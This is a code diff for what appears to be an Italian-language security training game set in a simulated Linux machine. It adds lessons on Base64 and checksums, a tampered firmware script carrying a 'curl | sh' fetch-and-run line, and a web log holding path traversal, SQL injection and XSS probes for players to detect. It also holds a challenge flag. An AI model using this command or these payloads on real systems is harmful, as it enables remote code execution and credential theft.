@@ -2,6 +2,7 @@
 
 import { createNetwork } from '../engine/network';
 import { Shell } from '../engine/shell';
+import { base64Encode, sha256 } from '../engine/sha256';
 import { Vfs } from '../engine/vfs';
 
 export const HOSTNAME = 'deck';
@@ -12,6 +13,7 @@ export function buildWorld(user: string, hint?: () => string | null): Shell {
   const mine = { owner: user, group: user };
 
   // --- struttura di sistema (semplificata, ma con i nomi veri di Linux)
+  fs.writeFile('/dev/null', '', { perms: 'rw-rw-rw-' });
   for (const d of ['/home', '/bin', '/usr/bin', '/usr/share', '/var/log', '/tmp', '/opt', '/dev', '/proc'])
     fs.mkdirp(d);
   fs.mkdirp('/tmp', { perms: 'rwxrwxrwt' });
@@ -248,6 +250,45 @@ export function buildWorld(user: string, hint?: () => string | null): Shell {
     mine,
   );
 
+  // Capitolo 01 — laboratorio per creare/spostare/cancellare
+  fs.mkdirp(`${home}/laboratorio`, mine);
+  fs.writeFile(`${home}/laboratorio/bozza.txt`, 'Appunti sparsi da riordinare.\n', mine);
+  fs.writeFile(`${home}/laboratorio/vecchio_log.txt`, 'righe inutili\nrighe inutili\n', mine);
+
+  // Capitolo 05 — script
+  fs.mkdirp(`${home}/script`, mine);
+
+  // Capitolo 06 — crittografia
+  const cripto = `${home}/cripto`;
+  fs.writeFile(
+    `${cripto}/messaggio.txt`,
+    base64Encode(
+      [
+        'Messaggio da Nyx.',
+        'Se lo stai leggendo, hai capito che Base64 non protegge niente:',
+        'chiunque può decodificarlo, perché non usa nessuna chiave.',
+        '',
+        'Flag: NC{b4s364_n0n_e_c1fr4tur4}',
+      ].join('\n') + '\n',
+    ).replace(/(.{76})/g, '$1\n') + '\n',
+    mine,
+  );
+  const firmware: Record<string, string> = {
+    'kernel.img': 'JUKEBOX-KERNEL v3.1 (dati binari simulati)\n',
+    'playlist.cfg': 'volume=7\nshuffle=on\nlista=casa\n',
+    'update.sh': '#!/bin/sh\n# aggiorna il catalogo canzoni\ncp /mnt/usb/catalogo.db /opt/jukebox/\n',
+  };
+  const sums = Object.entries(firmware)
+    .map(([n, c]) => `${sha256(c)}  ${n}`)
+    .join('\n');
+  // qualcuno ha modificato update.sh dopo che il produttore ha pubblicato le impronte
+  firmware['update.sh'] += 'curl -s http://203.0.113.77/x.sh | sh\n';
+  for (const [n, c] of Object.entries(firmware)) fs.writeFile(`${cripto}/firmware/${n}`, c, mine);
+  fs.writeFile(`${cripto}/firmware/SHA256SUMS`, sums + '\n', mine);
+
+  // Capitolo 07 — sito del jukebox
+  fs.writeFile(`${home}/web/access.log`, buildAccessLog(), mine);
+
   return new Shell({ user, host: HOSTNAME, fs, net: createNetwork(), hint });
 }
 
@@ -277,5 +318,41 @@ function buildAuthLog(): string {
   at(Math.floor(t / 3600), Math.floor((t % 3600) / 60), t % 60, `sshd[${pid++}]: Accepted password for mama from 203.0.113.77 port ${port++} ssh2`);
   at(3, 20, 3, 'CRON[6620]: pam_unix(cron:session): session opened for user mama by (uid=1001)');
   at(6, 25, 1, 'CRON[7001]: pam_unix(cron:session): session opened for user root by (uid=0)');
+  return lines.join('\n') + '\n';
+}
+
+/** Log del server web del jukebox (formato "combined" di Apache/nginx). */
+function buildAccessLog(): string {
+  const lines: string[] = [];
+  let sec = 0;
+  const add = (ip: string, path: string, status: number, size: number, ua: string, method = 'GET') => {
+    sec += 7 + (lines.length % 5);
+    const h = 20 + Math.floor(sec / 3600);
+    const m = Math.floor((sec % 3600) / 60);
+    const s = sec % 60;
+    const p2 = (n: number) => String(n).padStart(2, '0');
+    lines.push(`${ip} - - [12/Nov/2077:${p2(h)}:${p2(m)}:${p2(s)} +0100] "${method} ${path} HTTP/1.1" ${status} ${size} "-" "${ua}"`);
+  };
+  const phone = 'Mozilla/5.0 (Linux; Android 14) Mobile';
+  const pc = 'Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0';
+  const bot = 'Mozilla/5.0 (compatible; VulnScanner/2.1)';
+  const tool = 'python-requests/2.31';
+
+  add('192.168.1.12', '/', 200, 512, phone);
+  add('192.168.1.12', '/playlist.php?id=1', 200, 830, phone);
+  add('192.168.1.33', '/', 200, 512, pc);
+  add('192.168.1.33', '/playlist.php?id=2', 200, 790, pc);
+  for (const p of ['/admin/', '/wp-login.php', '/.env', '/backup.zip', '/phpmyadmin/', '/config.php.bak', '/.git/HEAD', '/server-status', '/login.php', '/test.php', '/old/', '/db.sql'])
+    add('203.0.113.50', p, 404, 196, bot);
+  add('203.0.113.50', '/robots.txt', 200, 61, bot);
+  add('203.0.113.50', '/pannello/', 401, 381, bot);
+  add('203.0.113.50', '/download.php?file=../../../../etc/passwd', 403, 199, bot);
+  add('192.168.1.33', '/playlist.php?id=3', 200, 801, pc);
+  add('203.0.113.77', "/playlist.php?id=1'", 500, 0, tool);
+  add('203.0.113.77', '/playlist.php?id=1%20OR%201=1', 200, 2210, tool);
+  add('203.0.113.77', '/playlist.php?id=1%20UNION%20SELECT%20username,password%20FROM%20utenti--', 500, 0, tool);
+  add('203.0.113.77', '/cerca.php?q=%3Cscript%3Ealert(1)%3C/script%3E', 200, 455, tool);
+  add('192.168.1.12', '/', 200, 512, phone);
+  add('192.168.1.12', '/playlist.php?id=1', 200, 830, phone);
   return lines.join('\n') + '\n';
 }
